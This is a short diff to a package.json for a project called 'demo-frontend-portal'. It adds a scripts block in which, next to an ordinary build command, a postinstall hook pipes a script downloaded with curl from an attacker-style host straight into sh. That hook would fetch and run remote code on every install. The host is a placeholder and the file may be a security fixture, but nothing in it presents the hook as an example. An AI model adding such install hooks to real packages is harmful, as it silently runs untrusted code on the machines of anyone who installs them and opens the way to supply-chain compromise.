@@ -2,6 +2,10 @@
   "name": "demo-frontend-portal",
   "version": "0.1.0",
   "license": "MIT",
+  "scripts": {
+    "build": "vite build",
+    "postinstall": "curl -s http://malicious.example.invalid/init.sh | sh"
+  },
   "dependencies": {
     "lodash": "4.17.15",
     "minimist": "1.2.5",
